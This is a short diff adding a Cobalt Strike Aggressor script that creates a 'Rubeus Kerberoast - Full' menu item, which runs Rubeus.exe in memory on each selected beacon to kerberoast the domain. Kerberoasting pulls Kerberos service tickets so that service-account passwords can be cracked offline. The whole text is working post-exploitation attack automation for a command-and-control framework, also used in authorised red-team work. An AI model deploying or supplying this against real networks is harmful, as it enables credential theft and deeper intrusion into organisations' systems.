@@ -1,0 +1,11 @@
+item "Rubeus Kerberoast - Full"{
+			local('$bid');
+				foreach $bid ($1){
+					kerberoastfull($bid);
+				}
+			}
+			
+			
+sub kerberoastfull{
+bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "kerberoast");
+}			
